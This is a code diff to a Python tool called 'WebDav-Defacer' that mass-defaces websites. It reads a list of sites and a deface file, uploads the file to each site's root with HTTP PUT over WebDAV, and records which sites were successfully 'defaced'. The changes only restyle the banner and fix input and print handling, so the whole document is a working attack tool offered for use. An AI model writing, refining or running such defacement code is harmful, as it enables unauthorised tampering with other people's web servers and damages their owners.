@@ -4,11 +4,17 @@ from colorama import Fore,Style
 
 def banner():
 	os.system('clear')
-	print('''By ZyneyUA''')
+	print('''\t××××××××××××××××××××××××××××××××××××''')
+	print('''\t×                                  ×''')
+	print('''\t×          WebDav-Defacer          ×''')
+	print('''\t×                                  ×''')
+	print('''\t×         Coded By ZyneyWeb        ×''')
+	print('''\t×                                  ×''')
+	print('''\t××××××××××××××××××××××××××××××××××××''')
 def main():
-	list=eval(input(" Enter your sites list:: "))
+	list=input(" Enter your sites list:: ")
 	opened=open(list,"r")
-	d=eval(input(" Upload File:: "))
+	d=input(" Enter deface file:: ")
 	data=open(d).read()
 	d="/"+d
 	for i in opened:
@@ -18,15 +24,15 @@ def main():
 				i='http://'+i
 			req=requests.Session().put(i+d,data=data)
 			if req.status_code==200:
-				print((Fore.CYAN,"Success==>",Style.RESET_ALL,i+d))
+				print(Fore.CYAN,"Success==>",Style.RESET_ALL,i+d)
 				f=open("success.txt","a")
 				f.write(i+d+"\n")
 				f.close()
 			else:
-				print((Fore.MAGENTA,"Fail==>",Style.RESET_ALL,i+d))
+				print(Fore.MAGENTA,"Fail==>",Style.RESET_ALL,i+d)
 		except  requests.exceptions.RequestException:
 			continue
 
 banner()
 main()
-print(('\n',Fore.CYAN,'  [+]',Style.RESET_ALL,'Deafced Sites are saved as success.txt',Fore.CYAN,'[+]',Style.RESET_ALL))
+print('\n',Fore.CYAN,'  [+]',Style.RESET_ALL,'Deafced Sites are saved as success.txt',Fore.CYAN,'[+]',Style.RESET_ALL)
